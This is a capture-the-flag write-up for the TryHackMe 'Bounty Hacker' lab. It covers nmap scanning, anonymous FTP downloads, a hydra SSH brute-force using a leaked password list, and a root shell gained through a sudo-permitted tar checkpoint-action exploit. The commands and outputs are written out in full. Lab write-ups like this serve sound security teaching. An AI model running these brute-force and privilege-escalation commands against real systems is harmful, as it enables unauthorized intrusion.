# Write-Up: Bounty Hacker

This write-up will walk you through the thought process behind solving the challenge and the decisions made along the way.

## Basic Information

- CTF: [TryHackMe](https://tryhackme.com/room/cowboyhacker)
- Difficulty: Easy

## Description

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

## Approach

### Enumeration

First, start up the machine and add the IP to your `/etc/hosts` file to use it during the challenge.

```bash
10.114.141.220 bountyhacker.thm
```

Now, we run an `nmap` scan with version detection and basic scripts against the machine to gain initial information.

```bash
nmap -sC -sV bountyhacker.thm
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 12:17 -0400
Nmap scan report for bountyhacker.thm (10.114.141.220)
Host is up (0.016s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.170.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cc:a7:48:fb:02:2d:81:ca:69:0a:f4:66:cc:28:d2:e1 (RSA)
|   256 2b:ec:e4:85:00:40:29:44:a8:a4:fa:fe:15:eb:b9:1c (ECDSA)
|_  256 09:03:e7:45:81:01:73:0e:f6:ff:0d:9a:c5:14:8c:52 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.80 seconds
```

We find an FTP server with anonymous login allowed, an open SSH port, and a web server. Let's see what we can find on the FTP server with anon login first. For this, just use `anonymous` as the login name.

### FTP Enumeration

```bash
ftp bountyhacker.thm                
Connected to bountyhacker.thm.
220 (vsFTPd 3.0.5)
Name (bountyhacker.thm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> mget *
```

We find two files on the server which we can download using `mget *`. `locks.txt` contains a list of password-like strings. `task.txt` contains a short plan signed by `lin`, which is the answer to our first real question of the room!

The next question hints that we can use the `locks.txt` as a password list to brute-force a service. Since the website contained no login form, the only other available login service is `SSH`.

### Initial Access

We could try out every password manually, but that is tedious. Let's use `hydra` for this purpose. With the tool we can automate the password testing against the SSH port. As the username, we use `lin` first, as the other note was signed by that name.

```bash
└─$ hydra -l lin -P locks.txt ssh://10.114.141.220
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-16 12:39:03
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.114.141.220:22/
[22][ssh] host: 10.114.141.220   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

And it worked! `Hydra` got us the credentials `lin`:`RedDr4gonSynd1cat3`. This is also the answer to the next question.

Now, use the credentials to connect via SSH to the server. On the server, we find the user flag on the `Desktop` of `lin`.

```bash
ssh lin@bountyhacker.thm 

Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
lin@ip-10-114-141-220:~/Desktop$ ls
user.txt
lin@ip-10-114-141-220:~/Desktop$ cat user.txt 
<redacted user flag>
```

The next step is to escalate our privileges to read the root flag. A first check is to look up `lin`'s root privileges.

### Privilege Escalation

```bash
lin@ip-10-114-141-220:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-114-141-220:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-114-141-220:
    (root) /bin/tar
```

We find sudo rights for `/bin/tar` that we can use to spawn a root shell. With a look at [GTFOBins](https://gtfobins.org/gtfobins/tar/#shell), we find a command to get us a root shell. With the root privileges, we can look at the standard location for the root flag and find it!

```bash
lin@ip-10-114-141-220:~/Desktop$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
<redacted root flag>
```

This answers the final question and finishes the box. Congratulations!

## Takeaway

This challenge shows how quickly small misconfigurations can add up to a full compromise. Anonymous FTP access exposed critical files, which could then be reused to brute-force the SSH login. After gaining access, basic enumeration was enough to identify overly permissive sudo rights. Using a known GTFOBins technique, this could be abused to escalate privileges to root. Overall, it reinforces the importance of checking every exposed service, reusing gathered information effectively, and not skipping simple privilege enumeration steps.
